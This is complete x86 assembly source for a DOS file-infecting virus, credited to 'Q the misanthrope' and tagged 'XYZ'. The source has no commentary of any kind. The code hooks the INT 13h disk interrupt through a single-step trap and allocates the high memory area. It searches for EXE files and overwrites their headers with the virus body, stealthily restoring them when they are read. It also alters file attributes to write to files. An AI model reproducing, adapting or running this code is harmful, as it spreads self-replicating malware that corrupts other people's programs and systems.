cseg        segment para    public  'code'
xyz     proc    near
assume      cs:cseg

;-----------------------------------------------------------------------------

;designed by "Q" the misanthrope.

;-----------------------------------------------------------------------------

.186

ABORT       equ 002h
ALLOCATE_HMA    equ 04a02h
CLOSE_HANDLE    equ 03e00h
COMMAND_LINE    equ 080h
COM_OFFSET  equ 00100h
CRITICAL_INT    equ 024h
DENY_NONE   equ 040h
DOS_INT     equ 021h
DOS_SET_INT equ 02500h
EIGHTEEN_BYTES  equ 012h
ENVIRONMENT equ 02ch
EXEC_PROGRAM    equ 04b00h
EXE_SECTOR_SIZE equ 004h
EXE_SIGNATURE   equ 'ZM'
FAR_INDEX_CALL  equ 01effh
FILE_ATTRIBUTES equ 04300h
FILE_DATE_TIME  equ 05700h
FILENAME_OFFSET equ 0001eh
FIND_FIRST  equ 04e00h
FIND_NEXT   equ 04f00h
FIRST_FCB   equ 05ch
FLUSH_BUFFERS   equ 00d00h
FOUR_BYTES  equ 004h
GET     equ 000h
GET_DTA     equ 02f00h
GET_ERROR_LEVEL equ 04d00h
GOLD_BUG_PTR    equ 0032ah
HARD_DISK_ONE   equ 081h
HIDDEN      equ 002h
HIGH_BYTE   equ 00100h
HMA_SEGMENT equ 0ffffh
INT_13_VECTOR   equ 0004ch
KEEP_CF_INTACT  equ 002h
MAX_SECTORS equ 078h
MULTIPLEX_INT   equ 02fh
NEW_EXE_HEADER  equ 00040h
NEW_EXE_OFFSET  equ 018h
NULL        equ 00000h
ONLY_READ   equ 000h
ONLY_WRITE  equ 001h
ONE_BYTE    equ 001h
OPEN_W_HANDLE   equ 03d00h
PARAMETER_TABLE equ 004f1h
READ_A_SECTOR   equ 00201h
READ_ONLY   equ 001h
READ_W_HANDLE   equ 03f00h
REMOVE_NOP  equ 001h
RESIZE_MEMORY   equ 04a00h
RES_OFFSET  equ 0f900h
SECOND_FCB  equ 06ch
SECTOR_SIZE equ 00200h
SET     equ 001h
SETVER_SIZE equ 018h
SHORT_JUMP  equ 0ebh
SINGLE_STEP_BIT equ 00100h
SIX_BYTES   equ 006h
SYSTEM      equ 004h
TERMINATE_W_ERR equ 04c00h
THREE_BYTES equ 003h
TWENTY_HEX  equ 020h
TWENTY_THREE    equ 017h
TWO_BYTES   equ 002h
UN_SINGLE_STEP  equ not(SINGLE_STEP_BIT)
VERIFY_2SECTORS equ 00402h
VOLUME_LABEL    equ 008h
WRITE_A_SECTOR  equ 00301h
WRITE_W_HANDLE  equ 04000h
XYZ_CODE_IS_AT  equ 0013Fh

;-----------------------------------------------------------------------------

bios_seg    segment at 0f000h
        org 00000h
old_int_13_addr label   word
bios_seg    ends

;-----------------------------------------------------------------------------

        org COM_OFFSET
com_code:

;-----------------------------------------------------------------------------

        jmp short alloc_memory
DISPLACEMENT    equ $

;-----------------------------------------------------------------------------

dummy_exe_head  dw  SIX_BYTES,TWO_BYTES,NULL,TWENTY_HEX,ONE_BYTE,HMA_SEGMENT,NULL,NULL,NULL,NULL,NULL,TWENTY_HEX

;-----------------------------------------------------------------------------

        org XYZ_CODE_IS_AT

;-----------------------------------------------------------------------------

ax_cx_di_si_cld proc    near
        mov di,bx
        add di,XYZ_CODE_IS_AT-COM_OFFSET
ax_cx_si_cld:   call    set_si
set_si:     pop si
        sub si,word ptr (offset set_si)-word ptr (offset ax_cx_di_si_cld)
        mov cx,COM_OFFSET+SECTOR_SIZE-XYZ_CODE_IS_AT
        xor ax,ax
        cld
        ret
ax_cx_di_si_cld endp

;-----------------------------------------------------------------------------

exe_file_mask   db  '*.E*',NULL

;-----------------------------------------------------------------------------

ALLOC_STARTS    equ $

;-----------------------------------------------------------------------------

alloc_memory    proc    near
        mov ah,high(FLUSH_BUFFERS)
        int DOS_INT
        xor di,di
        mov ds,di
        mov bh,high(SECTOR_SIZE)
        dec di
        mov ax,ALLOCATE_HMA
        int MULTIPLEX_INT
        mov bx,SIX_BYTES
        inc di
        jz  find_name
        call    ax_cx_si_cld
        rep movs byte ptr es:[di],cs:[si]
alloc_memory    endp

;-----------------------------------------------------------------------------

set_int_13  proc    near
        mov ax,offset interrupt_one
        xchg    word ptr ds:[bx-TWO_BYTES],ax
        push    ax
        push    word ptr ds:[bx]
        mov word ptr ds:[bx],cs
        xchg    cx,di
        mov dl,HARD_DISK_ONE
        pushf
        pushf
        pushf
        pop ax
        or  ah,high(SINGLE_STEP_BIT)
        push    ax
        popf
        cli
        mov ax,VERIFY_2SECTORS
        dw  FAR_INDEX_CALL,INT_13_VECTOR
        popf
        pop word ptr ds:[bx]
        pop word ptr ds:[bx-TWO_BYTES]
set_int_13  endp

;-----------------------------------------------------------------------------

find_name   proc    near
        mov ds,word ptr cs:[bx+ENVIRONMENT-SIX_BYTES]
look_for_nulls: inc bx
        cmp word ptr ds:[bx-FOUR_BYTES],di
        jne look_for_nulls
find_name   endp

;-----------------------------------------------------------------------------

open_file   proc    near
        push    ds
        push    bx
        mov di,7ffh
find_the_end:   inc di
        mov al,byte ptr ds:[bx+di-800h]
        cmp al,NULL
        mov cs:[di],al
        jne find_the_end
        mov si,80h
        xor ax,ax
        lods    byte ptr cs:[si]
        mov cx,ax
        inc cx
        add ax,di
        mov cs:[7ffh],al
        push    cs
        pop es
        rep movs byte ptr es:[di],cs:[si]
        mov ch,THREE_BYTES
        call    open_n_read_exe
        mov bx,dx
        call    convert_back
        pop dx
        pop ds
        jne now_run_it
        push    ds
        push    dx
        mov ax,GET+FILE_ATTRIBUTES
        int DOS_INT
        mov ax,SET+FILE_ATTRIBUTES
        push    cx
        push    ax
        xor cx,cx
        int DOS_INT
        mov ax,OPEN_W_HANDLE+DENY_NONE+ONLY_WRITE
        call    call_dos
        mov ax,GET+FILE_DATE_TIME
        push    ax
        int DOS_INT
        push    cx
        push    dx
        mov ah,high(WRITE_W_HANDLE)
        mov dx,offset goto_dos
        mov cx,SECTOR_SIZE
        int DOS_INT
erutangis   db  'ZYX'
        inc ax
        call    reclose_it
signature   db  'XYZ'
        pop ds
        int DOS_INT
open_file   endp

;-----------------------------------------------------------------------------

now_run_it  proc    near
        mov bx,30h
        mov ah,high(RESIZE_MEMORY)
        call    call_dos
        mov si,07ffh
        int 2eh
        mov ax,FIND_FIRST
        mov dx,offset exe_file_mask
        mov cx,READ_ONLY+HIDDEN+SYSTEM+VOLUME_LABEL
find_next_file: call    call_dos
        mov ah,high(GET_DTA)
        int DOS_INT
        add bx,FILENAME_OFFSET
        push    es
        pop ds
        call    open_n_read_exe
        mov ah,high(FIND_NEXT)
        loop    find_next_file
done:       mov ah,high(GET_ERROR_LEVEL)
        int DOS_INT
        mov ah,high(TERMINATE_W_ERR)
now_run_it  endp

;-----------------------------------------------------------------------------

call_dos    proc    near
        int DOS_INT
        jc  done
        xchg    ax,bx
        push    cs
        pop ds
        ret
call_dos    endp

;-----------------------------------------------------------------------------

open_n_read_exe proc    near
        mov dx,bx
        mov ax,OPEN_W_HANDLE+DENY_NONE+ONLY_READ
        call    call_dos
        mov dx,offset critical_error
        mov ax,DOS_SET_INT+CRITICAL_INT
        int DOS_INT
        mov dx,offset goto_dos
        mov ah,high(READ_W_HANDLE)
reclose_it: int DOS_INT
        mov ah,high(CLOSE_HANDLE)
        jmp short call_dos
open_n_read_exe endp

;-----------------------------------------------------------------------------

interrupt_one   proc    far
        cmp ax,VERIFY_2SECTORS
        jne interrupt_ret
        push    ds
        pusha
        mov bp,sp
        lds si,dword ptr ss:[bp+EIGHTEEN_BYTES]
        cmp word ptr ds:[si+ONE_BYTE],FAR_INDEX_CALL
        jne go_back
        mov si,word ptr ds:[si+THREE_BYTES]
        cmp word ptr ds:[si+TWO_BYTES],HMA_SEGMENT
        jne go_back
        cld
        mov di,cx
        movsw
        movsw
        sub di,word ptr (offset far_ptr_addr)-word ptr (offset int_13_entry)
        org $-REMOVE_NOP
        mov word ptr ds:[si-FOUR_BYTES],di
        and byte ptr ss:[bp+TWENTY_THREE],high(UN_SINGLE_STEP)
go_back:    popa
        pop ds
critical_error: mov al,ABORT
interrupt_ret:  iret
interrupt_one   endp

;-----------------------------------------------------------------------------

convert_back    proc    near
        call    ax_cx_di_si_cld
        repe    cmps byte ptr cs:[si],es:[di]
        jne not_xyz
        mov word ptr es:[bx],EXE_SIGNATURE
        call    ax_cx_di_si_cld
        rep stosb
not_xyz:    ret
convert_back    endp

;-----------------------------------------------------------------------------

convert_to  proc    near
        pusha
        stc
        pushf
        cmp word ptr es:[bx],EXE_SIGNATURE
        jne not_exe_header
        mov ax,word ptr es:[bx+EXE_SECTOR_SIZE]
        cmp ax,MAX_SECTORS
        ja  not_exe_header
        cmp al,SETVER_SIZE
        je  not_exe_header
        cmp word ptr es:[bx+NEW_EXE_OFFSET],NEW_EXE_HEADER
        jae not_exe_header
        call    ax_cx_di_si_cld
        pusha
        repe    scasb
        popa
        jne not_exe_header
        mov word ptr es:[bx],((ALLOC_STARTS-DISPLACEMENT)*HIGH_BYTE)+SHORT_JUMP
        rep movs byte ptr es:[di],cs:[si]
        popf
        clc
        pushf
not_exe_header: popf
        popa
        ret
convert_to  endp

;-----------------------------------------------------------------------------

interrupt_13    proc    far
int_13_entry:   cmp ah,high(READ_A_SECTOR)
        jb  call_old_int_13
        cmp ah,high(VERIFY_2SECTORS)
        ja  call_old_int_13
        call    convert_to
        pushf
        push    cs
        call    call_old_int_13
        pushf
        call    convert_to
        pusha
        jc  do_convertback
        mov ax,WRITE_A_SECTOR
        pushf
        push    cs
        call    call_old_int_13
do_convertback: call    convert_back
        popa
        popf
        retf    KEEP_CF_INTACT
interrupt_13    endp

;-----------------------------------------------------------------------------

        org COM_OFFSET+SECTOR_SIZE-ONE_BYTE

;-----------------------------------------------------------------------------

call_old_int_13 proc    near
        jmp far ptr old_int_13_addr
call_old_int_13 endp

;-----------------------------------------------------------------------------

        org COM_OFFSET+SECTOR_SIZE

;-----------------------------------------------------------------------------

goto_dos    proc    near
        mov ax,TERMINATE_W_ERR
        nop
far_ptr_addr:   int DOS_INT
goto_dos    endp

;-----------------------------------------------------------------------------

xyz     endp
cseg        ends
end     com_code
